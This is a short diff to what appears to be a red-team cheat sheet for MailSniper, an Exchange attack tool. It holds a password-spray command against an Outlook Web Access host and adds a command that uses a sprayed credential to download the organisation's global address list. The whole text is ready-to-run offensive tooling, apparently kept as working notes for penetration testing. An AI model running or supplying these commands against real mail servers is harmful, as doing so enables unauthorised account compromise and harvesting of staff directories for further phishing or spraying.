@@ -14,3 +14,9 @@ ipmo C:\Tools\MailSniper\MailSniper.ps1
 [+] Password Spray
 ==============================================================================
 Invoke-PasswordSprayOWA -ExchHostname mail.example.io -UserList .\Desktop\valid.txt -Password Summer2022
+
+==============================================================================
+[+] Downloading the global address list
+==============================================================================
+Get-GlobalAddressList -ExchHostname mail.example.io -UserName example.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
+
